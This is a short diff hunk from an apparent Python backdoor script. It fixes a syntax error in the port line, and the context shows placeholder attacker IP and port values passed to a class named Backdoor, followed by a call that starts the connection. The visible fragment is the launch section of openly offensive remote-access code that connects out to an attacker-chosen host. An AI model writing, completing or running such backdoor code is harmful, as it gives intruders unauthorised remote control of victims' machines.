@@ -63,6 +63,6 @@ class Backdoor:
         self.my_connection.close()
 
 my_ip = "x.x.x.x" # ex. 192.168.1.25
-my_port = "x" = # ex. 1234
+my_port = "x" # ex. 1234
 conn = Backdoor(my_ip, my_port)
 conn.start_connection()
